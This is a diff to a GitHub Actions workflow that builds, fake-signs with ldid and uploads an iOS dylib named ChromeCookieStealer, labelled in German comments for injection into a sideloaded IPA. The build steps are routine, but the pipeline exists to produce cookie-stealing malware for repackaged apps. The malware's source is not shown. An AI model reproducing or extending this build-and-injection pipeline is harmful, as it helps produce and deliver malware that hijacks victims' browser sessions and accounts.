@@ -17,11 +17,16 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt install -y build-essential fakeroot libz3-dev rsync curl perl unzip git libplist-utils libncurses6 clang ldid
+          sudo apt install -y build-essential fakeroot libz3-dev rsync curl perl unzip git libplist-utils libncurses6 clang
 
-      - name: Fix libtinfo Compatibility (für alte Toolchains)
+      - name: Fix libtinfo Compatibility
         run: |
           sudo ln -sf /usr/lib/x86_64-linux-gnu/libtinfo.so.6 /usr/lib/x86_64-linux-gnu/libtinfo.so.5
+
+      - name: Install ldid (Prebuilt Stable)
+        run: |
+          sudo curl -L https://github.com/ProcursusTeam/ldid/releases/download/v2.1.5-procursus7/ldid_linux_x86_64 -o /usr/local/bin/ldid
+          sudo chmod +x /usr/local/bin/ldid
 
       - name: Install Theos
         run: |
@@ -38,8 +43,12 @@ jobs:
           make clean
           make
 
+      - name: Fake-Sign dylib (für Injection in sideloaded IPA)
+        run: |
+          ldid -S obj/ChromeCookieStealer.dylib
+
       - name: Upload dylib als Artifact
         uses: actions/upload-artifact@v4
         with:
           name: ChromeCookieStealer.dylib
-          path: ./obj/ChromeCookieStealer.dylib
+          path: obj/ChromeCookieStealer.dylib
